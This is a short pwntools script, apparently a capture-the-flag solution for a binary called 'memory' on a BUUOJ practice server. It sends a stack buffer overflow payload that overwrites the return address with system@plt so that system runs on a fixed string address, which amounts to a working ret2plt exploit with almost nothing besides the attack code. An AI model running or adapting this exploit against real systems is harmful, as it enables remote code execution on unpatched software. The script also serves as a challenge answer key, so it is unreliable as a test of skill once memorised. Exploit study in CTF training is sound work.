# coding:utf-8
from pwn import *

context.log_level = 'debug'

proc_name = './memory'
p = process(proc_name)
p = remote('node3.buuoj.cn', 26190)
elf = ELF(proc_name)
system_plt = elf.plt['system']
main_addr = elf.sym['main']
payload = b'a' * (0x13 + 4) + p32(system_plt) + p32(main_addr) + p32(0x80487e0)
# p.recv() 本地和远程不太一样 本地把这条语句打开                                                                                                                                                                                                         
p.sendline(payload)
p.recv()
p.recv()

